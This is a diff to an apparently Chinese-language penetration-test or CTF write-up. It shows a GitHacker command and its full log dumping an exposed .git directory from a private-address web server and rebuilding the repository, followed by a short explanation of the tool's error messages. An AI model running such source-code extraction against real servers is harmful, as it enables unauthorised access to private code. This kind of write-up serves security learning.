@@ -78,4 +78,160 @@ Target: http://10.241.108.244/
 [14:36:10] 200 -    92B - /.git/config
 [14:36:10] 200 -   145B - /.git/index
 ```
-泄露了很多git，就直接停了，用githacker拉下来看看
+泄露了很多git，就直接停了，用githacker拉下来看看：
+```bash
+PS D:\webtool\GitHacker> githacker --url http://10.241.108.244/.git/ --output-folder result
+2026-04-29 14:43:26 INFO 1 urls to be exploited
+2026-04-29 14:43:26 INFO Exploiting http://10.241.108.244/.git/ into result\6ccb2befc73ddd0b28240fec20a21fcf
+2026-04-29 14:43:26 INFO Directory listing enable under: apache
+2026-04-29 14:43:26 ERROR [2880 bytes] 200 .git/?C=N;O=D
+2026-04-29 14:43:26 ERROR [2880 bytes] 200 .git/?C=D;O=A
+2026-04-29 14:43:26 ERROR [2880 bytes] 200 .git/?C=M;O=A
+2026-04-29 14:43:26 ERROR [2880 bytes] 200 .git/?C=S;O=A
+2026-04-29 14:43:26 INFO [2 bytes] 200 .git/COMMIT_EDITMSG
+2026-04-29 14:43:26 INFO [23 bytes] 200 .git/HEAD
+2026-04-29 14:43:26 ERROR [762 bytes] 200 .git/branches/?C=N;O=D
+2026-04-29 14:43:26 ERROR [762 bytes] 200 .git/branches/?C=M;O=A
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\config is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/config
+2026-04-29 14:43:26 ERROR [762 bytes] 200 .git/branches/?C=D;O=A
+2026-04-29 14:43:26 ERROR [762 bytes] 200 .git/branches/?C=S;O=A
+2026-04-29 14:43:26 INFO [73 bytes] 200 .git/description
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\?C=N;O=D is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\?C=S;O=A is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/?C=N;O=D
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/?C=S;O=A
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\?C=M;O=A is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\?C=D;O=A is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/?C=M;O=A
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/?C=D;O=A
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\applypatch-msg.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/applypatch-msg.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\commit-msg.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/commit-msg.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\fsmonitor-watchman.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/fsmonitor-watchman.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\post-update.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/post-update.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\pre-applypatch.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/pre-applypatch.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\pre-commit.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/pre-commit.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\pre-rebase.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/pre-rebase.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\pre-push.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\pre-receive.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/pre-push.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\pre-merge-commit.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/pre-merge-commit.sample
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/pre-receive.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\prepare-commit-msg.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/prepare-commit-msg.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\push-to-checkout.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/push-to-checkout.sample
+2026-04-29 14:43:26 ERROR C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7\.git\hooks\update.sample is potential dangerous, skip downloading this file
+2026-04-29 14:43:26 ERROR [-1 bytes] -1 .git/hooks/update.sample
+2026-04-29 14:43:26 ERROR [949 bytes] 200 .git/info/?C=N;O=D
+2026-04-29 14:43:26 INFO [145 bytes] 200 .git/index
+2026-04-29 14:43:26 ERROR [949 bytes] 200 .git/info/?C=M;O=A
+2026-04-29 14:43:26 ERROR [949 bytes] 200 .git/info/?C=S;O=A
+2026-04-29 14:43:26 ERROR [949 bytes] 200 .git/info/?C=D;O=A
+2026-04-29 14:43:26 INFO [240 bytes] 200 .git/info/exclude
+2026-04-29 14:43:26 ERROR [1133 bytes] 200 .git/logs/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1133 bytes] 200 .git/logs/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1133 bytes] 200 .git/logs/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1133 bytes] 200 .git/logs/?C=D;O=A
+2026-04-29 14:43:26 INFO [578 bytes] 200 .git/logs/HEAD
+2026-04-29 14:43:26 ERROR [961 bytes] 200 .git/logs/refs/?C=N;O=D
+2026-04-29 14:43:26 ERROR [961 bytes] 200 .git/logs/refs/?C=M;O=A
+2026-04-29 14:43:26 ERROR [961 bytes] 200 .git/logs/refs/?C=S;O=A
+2026-04-29 14:43:26 ERROR [961 bytes] 200 .git/logs/refs/?C=D;O=A
+2026-04-29 14:43:26 ERROR [979 bytes] 200 .git/logs/refs/heads/?C=N;O=D
+2026-04-29 14:43:26 ERROR [979 bytes] 200 .git/logs/refs/heads/?C=M;O=A
+2026-04-29 14:43:26 ERROR [979 bytes] 200 .git/logs/refs/heads/?C=S;O=A
+2026-04-29 14:43:26 ERROR [979 bytes] 200 .git/logs/refs/heads/?C=D;O=A
+2026-04-29 14:43:26 INFO [578 bytes] 200 .git/logs/refs/heads/master
+2026-04-29 14:43:26 ERROR [3000 bytes] 200 .git/objects/?C=N;O=D
+2026-04-29 14:43:26 ERROR [3000 bytes] 200 .git/objects/?C=S;O=A
+2026-04-29 14:43:26 ERROR [3000 bytes] 200 .git/objects/?C=M;O=A
+2026-04-29 14:43:26 ERROR [3000 bytes] 200 .git/objects/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/2d/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/2d/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/2d/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/2d/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/19/?C=N;O=D
+2026-04-29 14:43:26 INFO [55 bytes] 200 .git/objects/2d/ce93ea08ed9059be0a838c6bcf62b7b5c28907
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/19/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/19/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/19/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/67/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/67/?C=M;O=A
+2026-04-29 14:43:26 INFO [147 bytes] 200 .git/objects/19/36b7f0b8bc34642423c19738fab503a9d967de
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/67/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/67/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/90/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/90/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/90/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/90/?C=D;O=A
+2026-04-29 14:43:26 INFO [34 bytes] 200 .git/objects/67/3b2216187128dc73088ac5df036e854798c68f
+2026-04-29 14:43:26 INFO [21 bytes] 200 .git/objects/90/15a7a32ca0681be64471d3ac2f8c1f24c1040d
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/ab/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/ab/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/ab/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/ab/?C=D;O=A
+2026-04-29 14:43:26 INFO [55 bytes] 200 .git/objects/ab/d028b26786a20ba6f9dfe4de5305b7341c2395
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/b8/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/b8/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/b8/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/b8/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/bd/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/bd/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/bd/?C=S;O=A
+2026-04-29 14:43:26 INFO [147 bytes] 200 .git/objects/b8/295d6c67f5f2df8a3649af13bf6867b221cd17
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/bd/?C=D;O=A
+2026-04-29 14:43:26 INFO [1000 bytes] 200 .git/objects/bd/9990a1d46f17332711ccdf1d5ca32d584ae5c3
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f6/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f6/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f6/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f6/?C=D;O=A
+2026-04-29 14:43:26 INFO [86 bytes] 200 .git/objects/f6/86416a62f2dc219fc3d6168fd0ae38516f6422
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f7/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f7/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f7/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f7/?C=D;O=A
+2026-04-29 14:43:26 INFO [147 bytes] 200 .git/objects/f7/cc50a34b65f1c6cf3c8bd10e2b78271c348e35
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f9/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f9/?C=N;O=D
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f9/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1031 bytes] 200 .git/objects/f9/?C=D;O=A
+2026-04-29 14:43:26 INFO [117 bytes] 200 .git/objects/f9/f7d8ba3292488a6e7f9fa21d0968ca7bbd6637
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/info/?C=M;O=A
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/info/?C=N;O=D
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/info/?C=S;O=A
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/info/?C=D;O=A
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/pack/?C=N;O=D
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/pack/?C=S;O=A
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/pack/?C=M;O=A
+2026-04-29 14:43:26 ERROR [778 bytes] 200 .git/objects/pack/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1136 bytes] 200 .git/refs/?C=M;O=A
+2026-04-29 14:43:26 ERROR [1136 bytes] 200 .git/refs/?C=D;O=A
+2026-04-29 14:43:26 ERROR [1136 bytes] 200 .git/refs/?C=S;O=A
+2026-04-29 14:43:26 ERROR [1136 bytes] 200 .git/refs/?C=N;O=D
+2026-04-29 14:43:26 ERROR [964 bytes] 200 .git/refs/heads/?C=S;O=A
+2026-04-29 14:43:26 ERROR [964 bytes] 200 .git/refs/heads/?C=N;O=D
+2026-04-29 14:43:26 ERROR [964 bytes] 200 .git/refs/heads/?C=M;O=A
+2026-04-29 14:43:26 ERROR [964 bytes] 200 .git/refs/heads/?C=D;O=A
+2026-04-29 14:43:26 INFO [41 bytes] 200 .git/refs/heads/master
+2026-04-29 14:43:26 ERROR [769 bytes] 200 .git/refs/tags/?C=N;O=D
+2026-04-29 14:43:26 ERROR [769 bytes] 200 .git/refs/tags/?C=M;O=A
+2026-04-29 14:43:26 ERROR [769 bytes] 200 .git/refs/tags/?C=S;O=A
+2026-04-29 14:43:26 ERROR [769 bytes] 200 .git/refs/tags/?C=D;O=A
+2026-04-29 14:43:26 INFO Cloning downloaded repo from C:\Users\15819\AppData\Local\Temp\tmplb5ca5f7 to result\6ccb2befc73ddd0b28240fec20a21fcf
+2026-04-29 14:43:27 ERROR Cloning into 'result\6ccb2befc73ddd0b28240fec20a21fcf'...
+done.
+2026-04-29 14:43:27 INFO Check it out: result\6ccb2befc73ddd0b28240fec20a21fcf
+2026-04-29 14:43:27 INFO 1 / 1 were exploited successfully
+2026-04-29 14:43:27 INFO http://10.241.108.244/.git/ -> result\6ccb2befc73ddd0b28240fec20a21fcf
+```
+z注意这里虽然控制台输出很多`error`，但核心的 Git 对象和引用已经被正确抓取并重组到了 `result\6ccb2befc73ddd0b28240fec20a21fcf` 目录中。只是一些安全策略。
+## 
